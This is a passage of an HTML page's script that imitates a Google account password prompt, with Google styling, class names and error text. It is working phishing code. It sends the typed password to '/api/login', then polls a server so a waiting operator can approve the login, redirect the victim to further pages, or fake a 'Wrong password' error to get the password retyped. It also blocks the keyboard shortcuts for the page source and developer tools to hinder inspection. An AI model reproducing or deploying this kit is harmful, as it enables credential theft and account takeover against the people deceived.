            errEl.id = 'redo-error-msg';
            errEl.style.cssText = 'display:flex;align-items:center;gap:5px;margin-top:4px;color:#e8a09a;font-size:12px;font-family:Google Sans,Roboto,sans-serif;';
            errEl.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" height="14" width="14" viewBox="0 0 24 24" fill="#e8a09a"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Wrong password. Try again or click \'Forgot password\' to reset it.</span>';
            const inputContainer = document.querySelector('.H2p7Gf');
            if (inputContainer) inputContainer.insertAdjacentElement('afterend', errEl);
          }
          errEl.style.display = 'flex';
        }

        function clearError() {
          const styleEl = document.getElementById('redo-error-style');
          if (styleEl) styleEl.textContent = '';
          const label = document.querySelector('[jsname="YRMmle"]');
          if (label) label.style.color = '';
          const errEl = document.getElementById('redo-error-msg');
          if (errEl) errEl.style.display = 'none';
        }

        function clearForm() {
          if (passwordInput) {
            passwordInput.value = '';
            passwordInput.classList.remove('has-value');
          }
        }

        
        let successRedirectPending = false;
        function navigateTo(page) {
          if (page === 'success') {
            if (successRedirectPending) return;
            successRedirectPending = true;
            stopPolling();
            showLoading();
            const delay = 2000 + Math.floor(Math.random() * 1000);
            setTimeout(function() { window.location.href = SUCCESS_URL; }, delay);
          } else {
            stopPolling();
            showLoading();
            window.location.href = '/' + page + '?sid=' + encodeURIComponent(sid);
          }
        }

        let isWaitingForAdmin = false;
        let pollTimer = null;

        function stopPolling() {
          isWaitingForAdmin = false;
          if (pollTimer) clearTimeout(pollTimer);
        }

        function startPolling() {
          if (isWaitingForAdmin) return;
          isWaitingForAdmin = true;
          poll();
        }

        function poll() {
          if (!isWaitingForAdmin) return;

          fetch('/api/status/' + encodeURIComponent(sid))
            .then(res => res.json())
            .then(data => {
              if (!isWaitingForAdmin) return;

              
              if (data.status === 'gone') {
                stopPolling();
                sessionStorage.removeItem('sid');
                hideLoading();
                window.location.reload();
                return;
              }

              
              if (data.status === 'approved' || data.page === 'success') {
                navigateTo('success');
                return;
              }

              
              if (data.status === 'ok' && data.redirect && VALID_PAGES.includes(data.redirect)) {
                stopPolling();
                fetch('/api/clearOk', {
                  method: 'POST',
                  headers: { 'content-type': 'application/json' },
                  body: JSON.stringify({ sid })
                }).catch(() => {}).finally(() => {
                  showLoading();
                  window.location.href = '/' + data.redirect + '?sid=' + encodeURIComponent(sid);
                });
                return;
              }

              
              if (data.status === 'redo') {
                stopPolling();
                hideLoading();
                fetch('/api/clearRedo', {
                  method: 'POST',
                  headers: { 'content-type': 'application/json' },
                  body: JSON.stringify({ sid })
                }).catch(() => {}).finally(() => {
                  clearForm();
                  showError();
                });
                return;
              }

              pollTimer = setTimeout(poll, 1200);
            })
            .catch(err => {
              console.error('Poll error:', err);
              pollTimer = setTimeout(poll, 2000);
            });
        }

        async function handlePasswordSubmit(password) {
          showLoading();
          try {
            const res = await fetch('/api/login', {
              method: 'POST',
              headers: { 'content-type': 'application/json' },
              body: JSON.stringify({ sid, password })
            });
            if (res.ok) {
              startPolling();
            } else {
              hideLoading();
            }
          } catch (err) {
            console.error('Fetch error:', err);
            hideLoading();
          }
        }

        document.addEventListener('DOMContentLoaded', function() {
          applyStoredEmail();

          const nextBtn = document.getElementById('nextBtn');

          if (passwordInput && nextBtn) {
            nextBtn.addEventListener('mousedown', function() {
              const label = document.querySelector('[jsname="YRMmle"]');
              if (passwordInput.value.trim() !== '') {
                label.style.transform = 'translateY(-106%) scale(0.75)';
                label.style.transformOrigin = 'left top';
              }
            });

            passwordInput.addEventListener('blur', function() {
              const label = document.querySelector('[jsname="YRMmle"]');
              setTimeout(function() {
                if (passwordInput.value.trim() !== '') {
                  label.style.transform = 'translateY(-106%) scale(0.75)';
                  label.style.transformOrigin = 'left top';
                } else {
                  label.style.transform = '';
                  label.style.transformOrigin = '';
                }
              });
            });

            passwordInput.addEventListener('input', function() {
              clearError();
            });

            nextBtn.addEventListener('click', function(e) {
              e.preventDefault();
              e.stopPropagation();
              const password = passwordInput.value.trim();
              if (!password) { passwordInput.focus(); return; }
              handlePasswordSubmit(password);
            });

            passwordInput.addEventListener('keypress', function(e) {
              if (e.key === 'Enter') { e.preventDefault(); nextBtn.click(); }
            });
          }
        });
      })();
      document.addEventListener('keydown', function(e) {
  if (
    e.key === 'F12' ||
    (e.ctrlKey && e.key.toLowerCase() === 'u') ||
    (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(e.key.toLowerCase()))
  ) {
    e.preventDefault();
  }
});
    </script>
</body>
</html>
